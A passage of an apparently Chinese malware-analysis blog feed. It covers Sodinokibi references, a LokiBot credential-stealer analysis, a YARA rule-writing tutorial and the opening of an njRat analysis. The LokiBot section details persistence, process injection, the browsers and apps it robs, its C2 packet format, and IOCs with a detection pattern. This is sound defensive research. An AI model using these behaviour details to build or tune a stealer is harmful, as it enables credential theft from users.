href="https://www.klavor.com/dev/20190618-552.html" target="_blank" rel="noopener">https://www.klavor.com/dev/20190618-552.html</a></p><p>CPUID: <a href="https://blog.cubieserver.de/2018/query-cpuid-with-inline-assembly/" target="_blank" rel="noopener">https://blog.cubieserver.de/2018/query-cpuid-with-inline-assembly/</a></p><p>网络注册表: <a href="https://www.guidetotcpip.com/wp-content/uploads/files/Appendices/tcpip5e_WindowsRegistrySettings.pdf" target="_blank" rel="noopener">https://www.guidetotcpip.com/wp-content/uploads/files/Appendices/tcpip5e_WindowsRegistrySettings.pdf</a></p><p>Keyboard identifiers: <a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-language-pack-default-values" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-language-pack-default-values</a></p><p>IOCP: <a href="https://www.jianshu.com/p/838fbf0ce761" target="_blank" rel="noopener">https://www.jianshu.com/p/838fbf0ce761</a></p><p>WNetOpenEnumW: <a href="https://www.chainnews.com/zh-hant/articles/127835063940.htm" target="_blank" rel="noopener">https://www.chainnews.com/zh-hant/articles/127835063940.htm</a></p><p>analysis: <a href="https://www.secureworks.com/research/revil-sodinokibi-ransomware" target="_blank" rel="noopener">https://www.secureworks.com/research/revil-sodinokibi-ransomware</a></p><p><a href="https://www.antiy.com/response/20190628.html" target="_blank" rel="noopener">https://www.antiy.com/response/20190628.html</a></p><p><a href="http://www.jiangmin.com/download/Sodinokibi.pdf" target="_blank" rel="noopener">http://www.jiangmin.com/download/Sodinokibi.pdf</a></p><p><a href="https://www.tgsoft.it/immagini/news/20190705Sodinokibi/Sodinokibi_eng.pdf" target="_blank" rel="noopener">https://www.tgsoft.it/immagini/news/20190705Sodinokibi/Sodinokibi_eng.pdf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-样本信息&quot;&gt;&lt;a href=&quot;#0x01-样本信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 样本信息&quot;&gt;&lt;/a&gt;0x01 样本信息&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;样本名称: 2&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;样本大小:  280,579 字节&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;MD5:  7d88dfcfe457bdc715371dbeaa4a5ef7&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-1: f2f36ef9976259a55123250ecc78fda3487f8848&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-256:  8bf7a344480c29b572fcead838c863093a5c88ba21d51085b6fc6ec3d8e8fbac&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;家族: Sodinokibi&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;idb与样本地址:  &lt;a href=&quot;https://github.com/Xuwei98/malware-analysis/tree/master/Ransomware/2020-03-05-pe-Sodinokibi勒索病毒&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="样本分析" scheme="http://blog.dgmddw.xyz/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="VC" scheme="http://blog.dgmddw.xyz/tags/VC/"/>
    
      <category term="勒索病毒" scheme="http://blog.dgmddw.xyz/tags/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>LokiBot盗窃木马分析</title>
    <link href="http://blog.dgmddw.xyz/2020/02/25/2020-02-25-LokiBot%E7%9B%97%E7%AA%83%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://blog.dgmddw.xyz/2020/02/25/2020-02-25-LokiBot盗窃木马分析/</id>
    <published>2020-02-24T16:00:00.000Z</published>
    <updated>2020-03-24T08:07:13.112Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0x01-样本信息"><a href="#0x01-样本信息" class="headerlink" title="0x01 样本信息"></a>0x01 样本信息</h1><ul><li><p>样本名称: be037cea337159431437876263d88f41</p></li><li><p>版本:</p></li><li><p>样本大小:  451728字节</p></li><li><p>MD5:   be037cea337159431437876263d88f41</p></li><li><p>SHA-1: 6d8299516801d321627ebbd6b9cc3806620a8062</p></li><li><p>SHA-256: 169f98767d7949f8d8acbea53a63d32d34e35643cce5fb928a9189e89ab67f74</p></li><li><p>家族:Lokibot</p></li><li><p>idb与样本地址:  <a href="https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/Lokibot/2020-02-25" target="_blank" rel="noopener">github</a></p><a id="more"></a></li></ul><h1 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h1><ul><li>win10 x64 pro</li><li>VMware Workstaion 15</li></ul><h1 id="0x03-行为分析"><a href="#0x03-行为分析" class="headerlink" title="0x03 行为分析"></a>0x03 行为分析</h1><p><img src="https://i.loli.net/2020/02/23/Yaif6xnVwz85I4N.png" alt="image.png"><img src="https://i.loli.net/2020/02/23/TuaAXrvh2WpsfNq.png" alt="image.png"></p><ol><li><p>拷贝自身程序到<code>%TEMP%\\FolderN\\name.exe</code></p></li><li><p>创建快捷方式链接到<code>name.exe</code></p></li><li><p>将快捷方式注册到自启动注册表项下</p></li><li><p>创建<code>%TEMP%\\svhost.exe</code>并执行注入.<img src="https://i.loli.net/2020/02/24/QxXqWaoj9rcfpnI.png" alt="image.png"></p></li><li><p>创建<code>688152.exe</code>并隐藏.自我删除.<img src="https://i.loli.net/2020/02/24/TwaOhL4v7AzKSsQ.png" alt="image.png"></p></li><li><p>据沙箱显示,程序实现了盗窃信息相关功能.</p></li><li><p>连接C&amp;C服务器.上传信息.</p><p><img src="https://i.loli.net/2020/02/24/ACm29IKyjh6J1EY.png" alt="image.png"><img src="https://i.loli.net/2020/02/24/ydBAUkc3zgXH6ot.png" alt="image.png"></p></li></ol><h1 id="0x04-分析"><a href="#0x04-分析" class="headerlink" title="0x04 分析"></a>0x04 分析</h1><h2 id="PE解析"><a href="#PE解析" class="headerlink" title="PE解析"></a>PE解析</h2><p>使用<code>DIE</code>解析,<code>Smart Assembly</code>混淆,使用<code>dDe4dot</code>脱壳.<img src="https://i.loli.net/2020/02/20/xegBZcwMXNLylAm.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>载入dnspy,无法正常调试-&gt;”异常未处理”.换个方法,直接去找<code>payload</code>.也就是注入到傀儡进程中的<code>pe</code>文件.</p><h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><p>断下<code>WriteProcessMemory</code>注入必用API,第一次断点的buffer处即为注入文件.文件dump下来.</p><p><img src="https://i.loli.net/2020/02/24/hHIqlPadKWQwZYJ.png" alt="image.png"></p><h4 id="调试注意"><a href="#调试注意" class="headerlink" title="调试注意"></a>调试注意</h4><p>之前一直采用选中字符串拷贝到16进制编辑器里面,发现会出现pe文件无法执行的错误.</p><p>师傅让我使用在内存对话框-&gt;右键-&gt;备份-&gt;保存到文件.<img src="https://i.loli.net/2020/02/24/yqsrSZ5MagkPN6T.jpg" alt="_17C14264-2DE2-4785-A588-331910098A0F_.png.jpg"></p><p>保存后的文件为整个内存页的数据,使用16进制编辑器将多余数据删除后,保存即为所需pe文件.这样就能完美dump.</p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><table><thead><tr><th></th><th>hash</th></tr></thead><tbody><tr><td>MD5</td><td>8908eac8785008e5b70fbb016edf37d9</td></tr><tr><td>SHA-1</td><td>009ebdb9c9f5585da6ba8b2c677187e8cb276351</td></tr><tr><td>SHA-256</td><td>db2c292a8b787765d0a589b2110c9136e82730abb3c9a694da1cc3f6723ca98f</td></tr></tbody></table><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>加载dll</p><p><img src="https://i.loli.net/2020/02/25/AIZurbxE7Ljlei3.png" alt="image.png"></p><h3 id="创建互斥量"><a href="#创建互斥量" class="headerlink" title="创建互斥量"></a>创建互斥量</h3><p>Lokibot通过创建互斥锁来确保在受感染的系统上仅运行单个恶意软件实例.</p><p>互斥锁字符串作为MachineGUID的MD5哈希（通过注册表获得）进行计算</p><p><img src="https://i.loli.net/2020/02/25/s8zoKAkCWDZS4rI.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/25/WP6q7eSxmgb4rLa.png" alt="image.png"></p><h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><p><img src="https://i.loli.net/2020/02/25/8PNXRHkg92a1KQz.png" alt="image.png"></p><h4 id="信息窃取"><a href="#信息窃取" class="headerlink" title="信息窃取"></a>信息窃取</h4><p>从偏移值<code>0x13418</code>开始,不同软件窃取功能函数指针.</p><h5 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h5><p>login.json是新版的sqllite数据库文件.</p><table><thead><tr><th>firefox 家族</th><th>文件</th></tr></thead><tbody><tr><td></td><td>signons.sqlite, login.json</td></tr><tr><td>Mozilla Firefox</td><td>Flock</td></tr><tr><td>Comodo IceDragon</td><td><em>Postbox</em></td></tr><tr><td><em>Safari</em></td><td><em>Cyberfox</em></td></tr><tr><td>K-Meleon</td><td><em>Pale Moon</em></td></tr><tr><td>SeaMonkey</td><td>Black Hawk</td></tr><tr><td></td></tr></tbody></table><p><strong>Chrome 家族</strong></p><p>搜索文件(为sqllite文件),<img src="https://i.loli.net/2020/02/25/Og9BW3wVrZF1ieC.png" alt="image.png">采用硬编码去提取字符串所对应的信息</p><p><img src="https://i.loli.net/2020/02/25/4vYclT6pnVi3txZ.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/25/OZHeozKRj2dPMAF.png" alt="image.png"></p><p>浏览器为:</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>MapleStudio\ChromePlus</td><td>Comodo\Dragon</td></tr><tr><td>Chrome</td><td>Nichrome</td></tr><tr><td>Spark</td><td>RockMelt</td></tr><tr><td>Chromium</td><td>Titan Browser</td></tr><tr><td>Torch</td><td>Yandex\YandexBrowser</td></tr><tr><td>Epic Privacy Browser</td><td>CocCoc\Browser</td></tr><tr><td>Vivaldi</td><td>Comodo\Chromodo</td></tr><tr><td>Superbird</td><td>Coowon\Coowon</td></tr><tr><td>Mustang Browser</td><td>360Browser\Browser</td></tr><tr><td>CatalinaGroup\Citrio</td><td>Google\Chrome SxS</td></tr><tr><td>Orbitum</td><td>Iridium</td></tr><tr><td>Opera</td></tr></tbody></table><h5 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h5><p>Ftp软件聊天工具等软件,进行相应的窃取.对字符串进行了混淆,并没有一一识别.但下面的表中有大量操作在本样本中出现.</p><p><img src="https://i.loli.net/2020/02/25/dPMVeCXJqR8oixW.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/25/YTnRCPcwQeXDUhJ.png" alt="image.png"></p><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>子目录文件夹名为<code>MD5(MachineGUID)</code>的第8个到13个字符,第13到18个字符为文件名.</p><p><img src="https://i.loli.net/2020/02/25/kqnEi7w85RBvcjP.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/25/2Ii7eqMfvsVF6Xj.png" alt="image.png"></p><ul><li>.exe文件包含木马程序的可执行副本，该副本在用户登录帐户时触发，</li><li>生成.lck文件是为了防止在解密Windows凭据或键盘记录时发生资源冲突，</li><li>.hdb文件用于存储已传输到C＆C服务器的所有数据样本的哈希</li><li>.kdb文件又用于保存有关尚未发送到服务器的数据的信息</li></ul><h4 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h4><p><img src="https://i.loli.net/2020/02/25/eqZYIzXwJR8E9nv.png" alt="image.png"></p><p>最开始发送<code>ckav.ru</code>+初始信息+用户名+电脑名+MD5值</p><p><img src="https://i.loli.net/2020/02/25/lCJMhIBQXtxiwDE.png" alt="image.png"></p><p>然后会发送包含窃取的凭据加密后的信息.</p><p>TAG为<code>\ x12 \ x00 \ x27 \ x00</code>,在上述包的后面添加加密后的块信息,每个被盗数据段都以一个字节开头，该字节显示一个索引从索引列表中指示相应的应用程序。</p><p><img src="https://i.loli.net/2020/02/25/u2DcM8LvpJTA37R.png" alt="image.png"></p><h1 id="0x05-IOC"><a href="#0x05-IOC" class="headerlink" title="0x05 IOC"></a>0x05 IOC</h1><p>MD5:</p><p>8908eac8785008e5b70fbb016edf37d9</p><p>be037cea337159431437876263d88f41</p><p>IP:</p><p>185.29.11.57</p><h2 id="检测建议"><a href="#检测建议" class="headerlink" title="检测建议:"></a>检测建议:</h2><p>通过数据包 <code>ckav.ru</code>标识符进行检测.</p><h1 id="0x06-reference"><a href="#0x06-reference" class="headerlink" title="0x06 reference"></a>0x06 reference</h1><p>windows启动持久服务的注册表项: <a href="https://threatvector.cylance.com/en_us/home/windows-registry-persistence-part-2-the-run-keys-and-search-order.html" target="_blank" rel="noopener">https://threatvector.cylance.com/en_us/home/windows-registry-persistence-part-2-the-run-keys-and-search-order.html</a></p><p>Smart Assembly混淆器特性: <a href="https://blog.darkthread.net/blog/smartassembly/" target="_blank" rel="noopener">https://blog.darkthread.net/blog/smartassembly/</a></p><p>any.run 分析报告 <a href="https://any.run/malware-trends/lokibot" target="_blank" rel="noopener">https://any.run/malware-trends/lokibot</a></p><p>f-secure : <a href="https://www.f-secure.com/v-descs/trojan_w32_lokibot.shtml" target="_blank" rel="noopener">https://www.f-secure.com/v-descs/trojan_w32_lokibot.shtml</a></p><p>fortinet: <a href="https://www.fortinet.com/blog/threat-research/keep-your-account-safe-by-avoiding-dyzap-malware.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/keep-your-account-safe-by-avoiding-dyzap-malware.html</a></p><p><a href="https://www.sans.org/reading-room/whitepapers/malicious/loki-bot-information-stealer-keylogger-more-37850" target="_blank" rel="noopener">https://www.sans.org/reading-room/whitepapers/malicious/loki-bot-information-stealer-keylogger-more-37850</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-样本信息&quot;&gt;&lt;a href=&quot;#0x01-样本信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 样本信息&quot;&gt;&lt;/a&gt;0x01 样本信息&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;样本名称: be037cea337159431437876263d88f41&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;版本:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;样本大小:  451728字节&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;MD5:   be037cea337159431437876263d88f41&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-1: 6d8299516801d321627ebbd6b9cc3806620a8062&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-256: 169f98767d7949f8d8acbea53a63d32d34e35643cce5fb928a9189e89ab67f74&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;家族:Lokibot&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;idb与样本地址:  &lt;a href=&quot;https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/Lokibot/2020-02-25&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="样本分析" scheme="http://blog.dgmddw.xyz/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="VC" scheme="http://blog.dgmddw.xyz/tags/VC/"/>
    
      <category term="木马" scheme="http://blog.dgmddw.xyz/tags/%E6%9C%A8%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>YARA入门</title>
    <link href="http://blog.dgmddw.xyz/2020/02/18/2020-02-18-yara%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <id>http://blog.dgmddw.xyz/2020/02/18/2020-02-18-yara入门与实践/</id>
    <published>2020-02-18T10:49:00.000Z</published>
    <updated>2020-02-23T13:13:32.308Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="如何命中恶意软件"><a href="#如何命中恶意软件" class="headerlink" title="如何命中恶意软件"></a>如何命中恶意软件</h2><ul><li>Hash</li><li>特定字符串,识别特定软件或者是整个恶意软件家族</li><li>病毒或者木马的典型字节序列</li></ul><h2 id="YARA"><a href="#YARA" class="headerlink" title="YARA"></a>YARA</h2><p>通过创建寻找一定特征的描述识别恶意软件的工具.</p><p>每个描述可以是文本或二进制模式。这些描述被称为“规则</p><p>YARA通过正则模型识别恶意软件.</p><a id="more"></a><p>使用 16进制,纯文本,通配符,不区分大小写的字符串和特定运算符.</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">rule</span> <span class="string">silent_banker</span> <span class="string">:</span> <span class="string">banker</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="attr">    meta:</span></span><br><span class="line">        <span class="string">description</span> <span class="string">=</span> <span class="string">"This is just an example"</span></span><br><span class="line">        <span class="string">threat_level</span> <span class="string">=</span> <span class="number">3</span></span><br><span class="line">        <span class="string">in_the_wild</span> <span class="string">=</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    strings:</span></span><br><span class="line">        <span class="string">$a</span> <span class="string">=</span> <span class="string">&#123;6A</span> <span class="number">40</span> <span class="number">68</span> <span class="number">00</span> <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">6</span><span class="string">A</span> <span class="number">14</span> <span class="number">8</span><span class="string">D</span> <span class="number">91</span><span class="string">&#125;</span></span><br><span class="line">        <span class="string">$b</span> <span class="string">=</span> <span class="string">&#123;8D</span> <span class="number">4</span><span class="string">D</span> <span class="string">B0</span> <span class="number">2</span><span class="string">B</span> <span class="string">C1</span> <span class="number">83</span> <span class="string">C0</span> <span class="number">27</span> <span class="number">99</span> <span class="number">6</span><span class="string">A</span> <span class="number">4</span><span class="string">E</span> <span class="number">59</span> <span class="string">F7</span> <span class="string">F9&#125;</span></span><br><span class="line">        <span class="string">$c</span> <span class="string">=</span> <span class="string">"UVODFRYSIHLNWPEJXQZAKCBGMT"</span></span><br><span class="line"><span class="attr">    condition:</span></span><br><span class="line">        <span class="string">$a</span> <span class="string">or</span> <span class="string">$b</span> <span class="string">or</span> <span class="string">$c</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>这个例子表明YARA将识别包含这些字符串的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6A 40 68 00 30 00 00 6A 14 8D 91</span><br><span class="line">8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9</span><br><span class="line">&quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;</span><br></pre></td></tr></table></figure><p>被标记为<code>Silent Banker Trojan</code>.前两个是16进制字符串,最后是文本字符串.</p><h2 id="安装YARA"><a href="#安装YARA" class="headerlink" title="安装YARA"></a>安装YARA</h2><p><code>YARA</code>是同时支持Windows和基于Unix的系统.</p><p>命令行形式or<code>Python</code>脚本.</p><p><a href="https://yara.readthedocs.io/en/latest/gettingstarted.html#compiling-and-installing-yara" target="_blank" rel="noopener">安装文档</a></p><h2 id="使用网上现有的规则"><a href="#使用网上现有的规则" class="headerlink" title="使用网上现有的规则"></a>使用网上现有的规则</h2><p>精选的YARA规则:<a href="https://github.com/InQuest/awesome-yara" target="_blank" rel="noopener">awesome-yara</a></p><p>通过<code>Magic bytes</code>识别文件格式,分类文件内容: <a href="https://github.com/Xumeiquer/yara-forensics" target="_blank" rel="noopener"><strong>yara-forensics</strong></a></p><h2 id="下载需要的特定规则文件"><a href="#下载需要的特定规则文件" class="headerlink" title="下载需要的特定规则文件"></a>下载需要的特定规则文件</h2><p>使用<code>curl</code>指令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o FILE_NAME LINK_TO_FILE</span><br></pre></td></tr></table></figure><p><a href="https://github.com/VirusTotal/yara/blob/master/sample.rules" target="_blank" rel="noopener">sample.rules</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o sample.yara https://raw.githubusercontent.com/VirusTotal/yara/master/sample.rules</span><br></pre></td></tr></table></figure><h2 id="启动YARA"><a href="#启动YARA" class="headerlink" title="启动YARA"></a>启动YARA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yara [OPTIONS] RULES_FILE TARGET</span><br></pre></td></tr></table></figure><p>RULES_FILE是规则文件,TARGET指向目标文件</p><p>例子: 通过分析是否是PDF文件来使用YARA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o pdf.yara https://raw.githubusercontent.com/Xumeiquer/yara-forensics/master/file/pdf.yar</span><br></pre></td></tr></table></figure><p>然后，我们可以对要分析的文件运行YARA规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yara pdf.yara TARGET_FILE_TO_ANALYZE</span><br></pre></td></tr></table></figure><h2 id="如何写自己的yara规则"><a href="#如何写自己的yara规则" class="headerlink" title="如何写自己的yara规则"></a>如何写自己的yara规则</h2><p>网上没有现成的,你就只能自己写规则.</p><p><code>YarGen</code>是生成YARA规则的工具.能成给定的恶意软件的YARA规则.</p><p>通过字符串识别恶意软件,并删除已知的非恶意文件字符串.</p><p>YarGen包含字符串与字节码的巨大数据库,这些字符串和字节码也包含在非恶意文件中.</p><h2 id="安装YarGen"><a href="#安装YarGen" class="headerlink" title="安装YarGen"></a>安装YarGen</h2><p>python2支持.</p><p>下载最新版本<a href="https://github.com/Neo23x0/yarGen/releases" target="_blank" rel="noopener">release</a>,并且解压缩.</p><p>管理员权限下安装所有依赖项.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -2 -m pip install pefile cd</span><br><span class="line">py -2 -m pip install scandir lxml naiveBayesClassifier</span><br></pre></td></tr></table></figure><p>进入yarGen所在的文件夹.运行下述命令,下载内置数据库.保存到./dbs子目录中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -2 yarGen.py —-update</span><br></pre></td></tr></table></figure><h2 id="运行YarGen"><a href="#运行YarGen" class="headerlink" title="运行YarGen"></a>运行YarGen</h2><p>查看命令行参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -2 yarGen.py --help</span><br></pre></td></tr></table></figure><p>使用包含的数据库进行规则生成，运行命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -2 yarGen.py -m PATH_TO_MALWARE_DIRECTORY</span><br></pre></td></tr></table></figure><p>该命令将扫描PATH_TO_MALWARE_DIRECTORY目录下的恶意软件文件创建规则。在当前目录中创建名为<code>yargen_rules.yar</code>的文件将，其中包含生成的规则。</p><h2 id="学习YARA编写规则"><a href="#学习YARA编写规则" class="headerlink" title="学习YARA编写规则"></a>学习YARA编写规则</h2><h3 id="学习语法"><a href="#学习语法" class="headerlink" title="学习语法:"></a>学习语法:</h3><ul><li><p><a href="https://wiki.xwdidi.top/computer/security/RE/malware/YARA/creating_yara/" target="_blank" rel="noopener">编写Yara规则检测恶意软件</a></p></li><li><p><a href="https://yara.readthedocs.io/en/latest/" target="_blank" rel="noopener">官方文档</a></p></li></ul><h3 id="学习思路"><a href="#学习思路" class="headerlink" title="学习思路:"></a>学习思路:</h3><p>推荐一个YARA规则学习<a href="https://github.com/Neo23x0/signature-base" target="_blank" rel="noopener">仓库</a>,采用YARA的开源扫描器,有大量优质的YARA规则可以学习.</p><ol><li>分析该规则所对应的Rat家族或者virus等等,尽量分析透彻.</li><li>在分析透彻的前提下,阅读该规则.</li><li>对每处特征码进行思考,为什么会使用该特征码.学习思路.</li></ol><h2 id="视频推荐"><a href="#视频推荐" class="headerlink" title="视频推荐"></a>视频推荐</h2><p><a href="https://www.youtube.com/watch?v=PDnFJe9qrLA" target="_blank" rel="noopener">https://www.youtube.com/watch?v=PDnFJe9qrLA</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>参考自:<a href="https://medium.com/bugbountywriteup/intro-to-malware-detection-using-yara-eacab8373cf4" target="_blank" rel="noopener">https://medium.com/bugbountywriteup/intro-to-malware-detection-using-yara-eacab8373cf4</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;如何命中恶意软件&quot;&gt;&lt;a href=&quot;#如何命中恶意软件&quot; class=&quot;headerlink&quot; title=&quot;如何命中恶意软件&quot;&gt;&lt;/a&gt;如何命中恶意软件&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Hash&lt;/li&gt;
&lt;li&gt;特定字符串,识别特定软件或者是整个恶意软件家族&lt;/li&gt;
&lt;li&gt;病毒或者木马的典型字节序列&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;YARA&quot;&gt;&lt;a href=&quot;#YARA&quot; class=&quot;headerlink&quot; title=&quot;YARA&quot;&gt;&lt;/a&gt;YARA&lt;/h2&gt;&lt;p&gt;通过创建寻找一定特征的描述识别恶意软件的工具.&lt;/p&gt;
&lt;p&gt;每个描述可以是文本或二进制模式。这些描述被称为“规则&lt;/p&gt;
&lt;p&gt;YARA通过正则模型识别恶意软件.&lt;/p&gt;
    
    </summary>
    
    
      <category term="yara" scheme="http://blog.dgmddw.xyz/tags/yara/"/>
    
  </entry>
  
  <entry>
    <title>njRat远控木马分析</title>
    <link href="http://blog.dgmddw.xyz/2020/02/17/2020-02-17-njRat%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://blog.dgmddw.xyz/2020/02/17/2020-02-17-njRat远控木马分析/</id>
    <published>2020-02-16T16:00:00.000Z</published>
    <updated>2020-03-07T13:13:38.164Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0x01-样本信息"><a href="#0x01-样本信息" class="headerlink" title="0x01 样本信息"></a>0x01 样本信息</h1><ul><li><p>样本名称: 62c01f</p></li><li><p>样本大小:  1178394字节</p></li><li><p>家族: njRat</p></li><li><p>版本: 0.6.4</p></li><li><p>MD5:  62c01f1b2ac0a7bab6c3b50fd51e6a36</p></li><li><p>SHA-1: cfc301a04b9a4ffeb0dc4578c1998a4eb4754f7b</p></li><li><p>SHA-256: c46a631f0bc82d8c2d46e9d8634cc50242987fa7749cac097439298d1d0c1d6e</p></li><li><p>idb与样本地址:  <a href="https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/2020-02-17-njRat" target="_blank" rel="noopener">github</a></p><a id="more"></a></li></ul><h1 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h1><ul><li>win10 x64 pro</li><li>VMware Workstaion 15</li></ul><h1 id="0x03-病毒行为"><a href="#0x03-病毒行为" class="headerlink" title="0x03 病毒行为"></a>0x03 病毒行为</h1><h2 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h2><h3 id="本体程序"><a href="#本体程序" class="headerlink" title="本体程序"></a>本体程序</h3><h4 id="1-释放PE文件Tr-exe"><a href="#1-释放PE文件Tr-exe" class="headerlink" title="1. 释放PE文件Tr.exe"></a>1. 释放PE文件<code>Tr.exe</code></h4><p><code>%Temp%\\Tr.exe</code></p><p><img src="https://i.loli.net/2020/02/13/ru1m8V3wSlJ7iob.png" alt="image.png"></p><h4 id="2-拷贝自身文件"><a href="#2-拷贝自身文件" class="headerlink" title="2. 拷贝自身文件"></a>2. 拷贝自身文件</h4><p><code>%Temp%\\x.exe</code></p><p><img src="https://i.loli.net/2020/02/13/xdnBA1jphvb8kLE.png" alt="image.png"></p><h4 id="3-开机自启"><a href="#3-开机自启" class="headerlink" title="3. 开机自启"></a>3. 开机自启</h4><p>在开机启动文件夹创建快捷方式,指向自身</p><p><img src="https://i.loli.net/2020/02/13/aoe5MLEvDRjHu31.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/13/sB9foearEix8nSH.png" alt="image.png"></p><h3 id="Tr-exe"><a href="#Tr-exe" class="headerlink" 